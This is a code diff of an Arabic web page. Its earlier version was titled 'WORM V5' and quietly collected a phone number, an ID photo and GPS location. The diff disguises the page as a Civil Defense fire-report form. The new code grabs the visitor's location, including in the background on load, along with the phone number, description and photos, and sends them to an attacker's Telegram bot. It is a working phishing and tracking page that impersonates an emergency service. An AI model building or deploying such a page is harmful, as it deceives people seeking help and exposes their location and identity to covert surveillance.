@@ -3,90 +3,276 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بلاغ حريق - WORM V5</title>
+    <title>بلاغ حريق - الدفاع المدني</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: 'Arial', sans-serif;
-            background: #0d0d0d;
-            color: #fff;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
         .container {
-            background: #1e1e1e;
+            background: linear-gradient(145deg, #1e1e1e, #2a2a2a);
             padding: 30px;
-            border-radius: 20px;
-            max-width: 450px;
+            border-radius: 25px;
+            max-width: 480px;
             width: 100%;
-            border: 2px solid #ff2222;
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
+            border: 2px solid #ff3333;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
         }
-        h1 { color: #ff3333; text-align: center; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; }
-        input, button {
+        /* شعار الخوذ البيضاء */
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            font-weight: bold;
+            color: #ff0000;
+            border: 3px solid #ff3333;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        }
+        .logo-text {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        .logo-text span {
+            color: #ff3333;
+        }
+        .helmet-icon {
+            font-size: 40px;
+        }
+        h1 {
+            color: #ff3333;
+            text-align: center;
+            font-size: 28px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            margin: 10px 0;
+        }
+        .subtitle {
+            color: #888;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin: 18px 0 5px;
+            font-weight: bold;
+            color: #ddd;
+            font-size: 14px;
+        }
+        label .required {
+            color: #ff3333;
+            margin-left: 5px;
+        }
+        input, select, textarea {
             width: 100%;
-            padding: 12px;
+            padding: 12px 15px;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        input {
-            background: #2a2a2a;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #1a1a1a;
             color: #fff;
-            border: 1px solid #444;
+            border: 1px solid #333;
+            transition: 0.3s;
+            font-family: 'Arial', sans-serif;
         }
-        input:focus { outline: 2px solid #ff4444; }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #ff3333;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
+        }
+        textarea {
+            resize: vertical;
+            min-height: 70px;
+        }
+        select option {
+            background: #1a1a1a;
+            color: #fff;
+        }
         button {
-            background: #ff4444;
-            color: #fff;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 20px;
             transition: 0.3s;
+            background: linear-gradient(135deg, #ff3333, #cc0000);
+            color: #fff;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
         }
-        button:hover { background: #cc0000; transform: scale(1.02); }
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(255, 0, 0, 0.5);
+        }
+        button:active {
+            transform: scale(0.98);
+        }
         #status {
             margin-top: 15px;
-            padding: 10px;
+            padding: 12px;
             background: #111;
-            border-radius: 8px;
+            border-radius: 10px;
             text-align: center;
             font-size: 14px;
             color: #ffaa00;
+            border: 1px solid #222;
+            min-height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .hidden-gps {
-            display: none;
+        .file-upload {
+            position: relative;
+            background: #1a1a1a;
+            border: 2px dashed #444;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
         }
-        .btn-gps {
-            background: #2a6b2a;
-            margin-top: 5px;
-            padding: 8px;
+        .file-upload:hover {
+            border-color: #ff3333;
+            background: #1f1f1f;
+        }
+        .file-upload input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .file-upload .icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .file-upload .text {
+            color: #888;
             font-size: 14px;
         }
-        .btn-gps:hover { background: #1f8b1f; }
+        .file-upload .text span {
+            color: #ff3333;
+        }
+        .file-name {
+            color: #7fff7f;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        /* تأثيرات إضافية */
+        .glow {
+            animation: glowPulse 2s infinite;
+        }
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
+            50% { box-shadow: 0 0 40px rgba(255, 0, 0, 0.5); }
+        }
+        .divider {
+            border: none;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #ff3333, transparent);
+            margin: 15px 0;
+        }
+        .gps-badge {
+            display: inline-block;
+            background: #1a3a1a;
+            color: #7fff7f;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid #2a6a2a;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🚨 بلاغ حريق</h1>
+    <!-- الهيدر مع الشعار -->
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo">
+                <span>🪖</span>
+            </div>
+            <div class="logo-text">
+                الدفاع <span>المدني</span><br>
+                <span style="font-size:12px;color:#888;">Civil Defense</span>
+            </div>
+            <div style="font-size:35px;">🚒</div>
+        </div>
+        <h1>🚨 بلاغ حريق</h1>
+        <div class="subtitle">
+            <span class="gps-badge">📍 الموقع يُجلب تلقائياً</span>
+        </div>
+    </div>
 
-    <label>📞 رقم الهاتف</label>
-    <input type="text" id="phone" placeholder="مثال: 0952725590" value="0952725590">
+    <hr class="divider">
 
-    <label>🪪 صورة الهوية</label>
-    <input type="file" id="idImage" accept="image/*">
+    <!-- رقم الهاتف -->
+    <label>📞 رقم هاتف المبلغ <span class="required">*</span></label>
+    <input type="text" id="phone" placeholder="مثال: ادخل رقم هاتفك" value="0952725590">
 
-    <!-- لا شيء يظهر للمستخدم عن الموقع – كل شيء في الخلفية -->
-    <div class="hidden-gps"></div>
+    <!-- نوع الحريق -->
+    <label>🔥 نوع الحريق <span class="required">*</span></label>
+    <select id="fireType">
+        <option value="منزل">🏠 منزل</option>
+        <option value="أرض زراعية">🌾 أرض زراعية</option>
+        <option value="آلية">🚗 آلية (سيارة / شاحنة)</option>
+        <option value="أخرى">📝 أخرى</option>
+    </select>
 
-    <button id="sendBtn">🔥 إرسال البلاغ</button>
-    <div id="status">⏳ في انتظار الإرسال</div>
+    <!-- وصف إضافي -->
+    <label>📝 وصف إضافي</label>
+    <textarea id="description" placeholder="أدخل تفاصيل إضافية عن الحريق..."></textarea>
+
+    <!-- صورة الحريق (اختياري) -->
+    <label>📸 صورة الحريق (اختياري)</label>
+    <div class="file-upload" id="fileUpload">
+        <span class="icon">🔥</span>
+        <div class="text">اضغط لاختيار صورة <span>للحريق</span></div>
+        <div class="file-name" id="fileName">لم يتم اختيار صورة</div>
+        <input type="file" id="fireImage" accept="image/*">
+    </div>
+
+    <hr class="divider">
+
+    <!-- زر الإرسال -->
+    <button id="sendBtn">🚨 إرسال البلاغ</button>
+    <div id="status">⏳ جاهز للإرسال</div>
 </div>
 
 <script>
@@ -95,8 +281,13 @@
 
     let userLat = null;
     let userLon = null;
-    let gpsResolve = null;
-    let gpsReject = null;
+
+    // ======== عرض اسم الملف المختار ========
+    document.getElementById('fireImage').addEventListener('change', function(e) {
+        const fileName = e.target.files[0] ? e.target.files[0].name : 'لم يتم اختيار صورة';
+        document.getElementById('fileName').textContent = fileName;
+        document.getElementById('fileName').style.color = fileName.includes('لم') ? '#888' : '#7fff7f';
+    });
 
     // ======== دالة جلب الموقع ========
     function getGPS() {
@@ -116,13 +307,13 @@
                 (err) => {
                     let msg = '';
                     switch (err.code) {
-                        case 1: msg = 'الموقع مرفوض (افتح الإعدادات واسمح)';
+                        case 1: msg = '❌ تم رفض الموقع. يرجى السماح بالوصول إلى الموقع في إعدادات المتصفح';
                             break;
-                        case 2: msg = 'الموقع غير متاح حالياً';
+                        case 2: msg = '📡 الموقع غير متاح حالياً';
                             break;
-                        case 3: msg = 'انتهت مهلة المحاولة';
+                        case 3: msg = '⏱️ انتهت مهلة المحاولة';
                             break;
-                        default: msg = 'خطأ غير معروف: ' + err.message;
+                        default: msg = '⚠️ خطأ غير معروف: ' + err.message;
                     }
                     reject(msg);
                 },
@@ -136,25 +327,41 @@
     }
 
     // ======== إرسال البيانات إلى تليجرام ========
-    async function sendToTelegram(phone, imageFile, lat, lon) {
+    async function sendToTelegram(phone, fireType, description, imageFile, lat, lon) {
         const statusDiv = document.getElementById('status');
         statusDiv.innerHTML = '⏳ جاري الإرسال...';
         statusDiv.style.color = '#ffaa00';
 
         const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const caption = `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n🏷️ النوع: ${fireType}\n📝 الوصف: ${description || "لا يوجد"}\n📍 الموقع: ${mapsLink}`;
 
         try {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('document', imageFile);
-            formData.append('caption', 
-                `🔥 بلاغ حريق\n📞 الهاتف: ${phone}\n📍 الموقع (رابط): ${mapsLink}`
-            );
+            let response;
 
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            });
+            if (imageFile) {
+                // إرسال مع صورة
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', imageFile);
+                formData.append('caption', caption);
+
+                response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                // إرسال نص فقط
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: caption,
+                    parse_mode: 'HTML'
+                };
+                response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            }
 
             const data = await response.json();
             if (data.ok) {
@@ -170,50 +377,44 @@
         }
     }
 
-    // ======== زر الإرسال الرئيسي (يجبر الموقع) ========
+    // ======== زر الإرسال الرئيسي ========
     document.getElementById('sendBtn').addEventListener('click', async function () {
         const phone = document.getElementById('phone').value.trim();
-        const fileInput = document.getElementById('idImage');
-        const file = fileInput.files[0];
+        const fireType = document.getElementById('fireType').value;
+        const description = document.getElementById('description').value.trim();
+        const imageFile = document.getElementById('fireImage').files[0];
         const statusDiv = document.getElementById('status');
 
-        // التحقق من الحقول
+        // التحقق من الحقول الإجبارية
         if (!phone) {
             statusDiv.innerHTML = '⚠️ أدخل رقم الهاتف';
             statusDiv.style.color = '#ffaa00';
             return;
         }
-        if (!file) {
-            statusDiv.innerHTML = '⚠️ اختر صورة الهوية';
-            statusDiv.style.color = '#ffaa00';
-            return;
-        }
 
-        // ======== جلب الموقع ========
-        statusDiv.innerHTML = '⏳ جاري جلب الموقع...';
+        // ======== جلب الموقع (إجباري) ========
+        statusDiv.innerHTML = '📍 جاري جلب الموقع... يرجى الموافقة على الإذن';
         statusDiv.style.color = '#ffaa00';
 
         try {
-            const gpsData = await getGPS(); // ينتظر حتى يجلب الموقع أو يرفض
+            const gpsData = await getGPS();
             userLat = gpsData.lat;
             userLon = gpsData.lon;
 
             // الموقع جاهز – نرسل
-            await sendToTelegram(phone, file, userLat, userLon);
+            await sendToTelegram(phone, fireType, description, imageFile, userLat, userLon);
 
         } catch (error) {
             // فشل الموقع – نمنع الإرسال
-            statusDiv.innerHTML = `❌ لا يمكن الإرسال بدون موقع: ${error}`;
+            statusDiv.innerHTML = `❌ ${error}`;
             statusDiv.style.color = '#ff6666';
 
-            // نعرض رسالة للمستخدم أنه يجب السماح بالموقع
-            alert(`⚠️ لا يمكن إرسال البلاغ دون تحديد الموقع.\nالرجاء السماح للمتصفح بالوصول إلى الموقع.\nالخطأ: ${error}`);
+            // تنبيه إجباري للمستخدم
+            alert(`⚠️ لا يمكن إرسال البلاغ دون تحديد الموقع.\n\n${error}\n\nالرجاء السماح للمتصفح بالوصول إلى الموقع.`);
         }
     });
 
-    // ======== جلب أولي لتجهيز الموقع (في الخلفية) ========
-    // نحاول جلب الموقع فوراً ولكن بدون إزعاج المستخدم
-    // إذا رفض، لا بأس، سيُطلب منه عند الإرسال
+    // ======== جلب أولي في الخلفية (بدون إزعاج) ========
     setTimeout(() => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -228,14 +429,18 @@
                 }
             );
         }
-    }, 100);
+    }, 500);
 
     // تحديث الحالة عند تغيير المدخلات
     document.getElementById('phone').addEventListener('input', () => {
         document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
         document.getElementById('status').style.color = '#ffaa00';
     });
-    document.getElementById('idImage').addEventListener('change', () => {
+    document.getElementById('fireType').addEventListener('change', () => {
+        document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
+        document.getElementById('status').style.color = '#ffaa00';
+    });
+    document.getElementById('description').addEventListener('input', () => {
         document.getElementById('status').innerHTML = '⏳ جاهز للإرسال';
         document.getElementById('status').style.color = '#ffaa00';
     });
